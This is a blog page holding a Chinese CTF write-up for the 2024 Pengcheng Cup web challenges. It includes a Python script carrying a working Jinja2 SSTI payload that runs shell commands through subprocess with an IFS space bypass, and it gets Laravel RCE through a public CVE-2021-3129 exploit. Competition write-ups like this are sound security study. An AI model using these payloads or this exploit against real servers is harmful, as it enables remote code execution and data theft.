@@ -1,0 +1,1207 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>2024鹏城杯WP - “我不是二次元!”</title>
+<meta name="google-site-verification" content="h9oKh1TF3yoRruKT3WlUVZjvkSiR172joz61JoqHXCM" />
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="/images/2.ico" type="image/x-icon" />
+<meta name="description" content="Webpython口算访问题目看要求是要一秒答题，果断找gpt写脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import requestsfrom bs4 import BeautifulSoupimport reimpor">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024鹏城杯WP">
+<meta property="og:url" content="https://m1racle-7.github.io/2024/11/10/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFWP/index.html">
+<meta property="og:site_name" content="“我不是二次元!”">
+<meta property="og:description" content="Webpython口算访问题目看要求是要一秒答题，果断找gpt写脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import requestsfrom bs4 import BeautifulSoupimport reimpor">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204414282-806340589.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204503328-1700217939.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204533224-871070081.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204538045-365324802.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204558132-668296899.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204607120-450017409.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204642089-281007871.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204705557-1565179572.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204725436-400606183.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204740357-677709090.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204746082-101934285.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205437172-318927515.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205437172-318927515.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205444958-1050385586.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205502169-1811646368.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205513354-1792537572.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205601347-1546485428.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205613652-933257913.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205654359-4809249.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205703837-1572091863.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/IB6e03GSTNsCq10J.png!thumbnail">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205236168-702125291.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205241457-510358314.png">
+<meta property="article:published_time" content="2024-11-10T13:11:17.735Z">
+<meta property="article:modified_time" content="2024-11-10T13:11:52.603Z">
+<meta property="article:author" content="Miracle">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204414282-806340589.png">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1731244331117">
+
+<link rel="stylesheet" href="/css/style.css?v=1731244331117">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1731244331117">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1731244331117"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(/images/b.png)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="Miracle"><img src="/images/a.jpg" alt="Miracle"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Miracle">
+            <img src="/images/a.jpg" alt="Miracle" alt="Miracle">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>8</div>
+        <div><span>标签</span>4</div>
+        <div><span>分类</span>4</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="友链">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                友链
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+
+
+	<script async src="/js/search.js?v=1731244331117"></script>
+
+
+
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CTF/">CTF</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/PHP/">PHP</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/linux/">linux</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/内网/">内网</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 10px;">内网</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(4);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">8</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">最新文章</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/11/10/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFWP/">2024鹏城杯WP</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/04/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E8%AE%A4%E8%AF%81/">域渗透之Kerberos认证</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WriteUp/">网鼎杯-青龙组WP</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/21/2024%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81WP/">2024强网拟态WP-- by MYGO!!!</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/09/%E6%97%A0curl%E3%80%81wget%E8%AE%BF%E9%97%AE%E4%B8%8B%E8%BD%BD%E4%BA%92%E8%81%94%E7%BD%91%E8%B5%84%E6%BA%90/">无curl、wget下的环境来访问下载工具</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2024 Miracle
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+        <div style="font-size: 13px">
+            <link rel="stylesheet" href="https://widget.heweather.net/standard/static/css/he-standard.css?v=1.4.0"><script src="https://widget.heweather.net/standard/static/js/he-standard.js?v=1.4.0"></script><script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            本站总访问量  <a id="busuanzi_value_site_pv"></a> 次<br>
+            本站访客数<a id="busuanzi_value_site_uv"></a>人次
+    </div>
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover"> 
+            <img src="/images/b.png" alt="2024鹏城杯WP" loading="lazy">
+            <h1>2024鹏城杯WP</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2024年11月10日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/CTF/">CTF</a>
+        
+        
+    <a><i class="nexmoefont icon-areachart"></i>约7.1k字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要38分钟</a>
+
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="python口算"><a href="#python口算" class="headerlink" title="python口算"></a>python口算</h2><p>访问题目看要求是要一秒答题，果断找gpt写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> fenjing</span><br><span class="line"><span class="comment"># 主页面 URL</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28/&quot;</span></span><br><span class="line">calc_url = url + <span class="string">&quot;calc&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起第一次请求，获取初始页面内容</span></span><br><span class="line">response = requests.get(url, headers=headers)</span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 h1 标签内容</span></span><br><span class="line">h1_text = soup.find(<span class="string">&#x27;h1&#x27;</span>).get_text().strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;第一次请求内容:&quot;</span>, h1_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 h1 标签内容为 &quot;Are you ready for this?&quot;，等待一秒后检查新的内容</span></span><br><span class="line"><span class="keyword">if</span> h1_text == <span class="string">&quot;Are you ready for this?&quot;</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># 等待 1 秒</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二次请求 /calc，模拟页面定时刷新后的情况</span></span><br><span class="line">    response = requests.get(calc_url, headers=headers)</span><br><span class="line">    h1_text = response.text.strip()  <span class="comment"># 获取返回内容</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查返回内容是否为算术表达式</span></span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&quot;^[\d\+\-\*/\s]+$&quot;</span>, h1_text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;算术表达式为：&quot;</span>, h1_text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 使用 eval 计算结果</span></span><br><span class="line">            result = <span class="built_in">eval</span>(h1_text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算结果为：&quot;</span>, result)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构造带有计算结果和 username 参数的 URL</span></span><br><span class="line">            answer_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=提交&quot;</span></span><br><span class="line">        </span><br><span class="line">            <span class="comment"># 提交答案并打印返回内容</span></span><br><span class="line">            response = requests.get(answer_url, headers=headers)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;提交答案后的返回内容：&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 提取返回中的 flag&#123;&#125; 内容</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;flag\&#123;.*?\&#125;&#x27;</span>, response.text)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                flag = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;获取到的 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;未找到 flag!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算表达式时出错：&quot;</span>, e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;返回内容不是算术表达式：&quot;</span>, h1_text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;页面内容未发生变化，h1 内容为：&quot;</span>, h1_text)</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204414282-806340589.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>得到奖品</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index(solved=0):</span><br><span class="line">    global current_expr</span><br><span class="line"></span><br><span class="line">    # 前端计算</span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    # 通过计算</span><br><span class="line"></span><br><span class="line">    username = &#x27;ctfer!&#x27;</span><br><span class="line">    if request.args.get(&#x27;username&#x27;):</span><br><span class="line">        username = request.args.get(&#x27;username&#x27;)</span><br><span class="line">        if whitelist_filter(username,whitelist_patterns):</span><br><span class="line">            if blacklist_filter(username):</span><br><span class="line">                return render_template_string(&quot;filtered&quot;)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;你过关！&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return render_template_string(&quot;filtered&quot;)</span><br><span class="line">    return render_template(&#x27;index.html&#x27;, username=username, hint=&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>发现这有个额外的参数username，就一直试get传参，怎么传都传不上去，多次测试后发现需要用get传data值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造带有计算结果和 username 参数的 URL</span></span><br><span class="line">answer_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=提交&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#123;&#123;7*7&#125;&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 提交答案并打印返回内容</span></span><br><span class="line">response = requests.get(answer_url, headers=headers,data=data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;提交答案后的返回内容：&quot;</span>, response.text)</span><br></pre></td></tr></table></figure>
+
+<p>修改上面这部分代码</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204503328-1700217939.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>成功执行，后面就ssti直接打了，注意在黑名单有个空格过滤，需要绕一下最终payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> fenjing</span><br><span class="line"><span class="comment"># 主页面 URL</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28/&quot;</span></span><br><span class="line">calc_url = url + <span class="string">&quot;calc&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起第一次请求，获取初始页面内容</span></span><br><span class="line">response = requests.get(url, headers=headers)</span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 h1 标签内容</span></span><br><span class="line">h1_text = soup.find(<span class="string">&#x27;h1&#x27;</span>).get_text().strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;第一次请求内容:&quot;</span>, h1_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 h1 标签内容为 &quot;Are you ready for this?&quot;，等待一秒后检查新的内容</span></span><br><span class="line"><span class="keyword">if</span> h1_text == <span class="string">&quot;Are you ready for this?&quot;</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># 等待 1 秒</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二次请求 /calc，模拟页面定时刷新后的情况</span></span><br><span class="line">    response = requests.get(calc_url, headers=headers)</span><br><span class="line">    h1_text = response.text.strip()  <span class="comment"># 获取返回内容</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查返回内容是否为算术表达式</span></span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&quot;^[\d\+\-\*/\s]+$&quot;</span>, h1_text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;算术表达式为：&quot;</span>, h1_text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 使用 eval 计算结果</span></span><br><span class="line">            result = <span class="built_in">eval</span>(h1_text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算结果为：&quot;</span>, result)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构造带有计算结果和 username 参数的 URL</span></span><br><span class="line">            answer_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=提交&quot;</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;&#123;&#123;[].__class__.__base__.__subclasses__()[351](&#x27;cat$&#123;IFS&#125;/flag&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># 提交答案并打印返回内容</span></span><br><span class="line">            response = requests.get(answer_url, headers=headers,data=data)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;提交答案后的返回内容：&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 提取返回中的 flag&#123;&#125; 内容</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;flag\&#123;.*?\&#125;&#x27;</span>, response.text)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                flag = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;获取到的 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;未找到 flag!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算表达式时出错：&quot;</span>, e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;返回内容不是算术表达式：&quot;</span>, h1_text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;页面内容未发生变化，h1 内容为：&quot;</span>, h1_text)</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204533224-871070081.png" alt="img" data-caption="img" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204538045-365324802.png" alt="img" data-caption="img" loading="lazy"></p>
+<h2 id="ezlaravel"><a href="#ezlaravel" class="headerlink" title="ezlaravel"></a>ezlaravel</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204558132-668296899.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>有版本号，google搜相关exp</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204607120-450017409.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>通过<a target="_blank" rel="noopener" href="https://www.ambionics.io/blog/laravel-debug-rce">https://www.ambionics.io/blog/laravel-debug-rce</a></p>
+<p>验证确定是CVE-2021-3129</p>
+<p>图片上的链接试过出不来，接着找其他这个CVE的exp</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204642089-281007871.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>最终在github挨个试，找到这个项目<a target="_blank" rel="noopener" href="https://github.com/joshuavanderpoll/CVE-2021-3129">https://github.com/joshuavanderpoll/CVE-2021-3129</a></p>
+<p>要把项目中的phpggc-master目录下的文件都复制到与CVE-2021-3129.py同级目录，不然会报错</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-<span class="number">2021</span>-<span class="number">3129.</span>py --force</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204705557-1565179572.png" alt="img" data-caption="img" loading="lazy"></p>
+<p><code>laravel/rce12</code>这条链子可以RCE</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204725436-400606183.png" alt="img" data-caption="img" loading="lazy"></p>
+<p>最后在根目录找到flag.txt</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204740357-677709090.png" alt="img" data-caption="img" loading="lazy"></p>
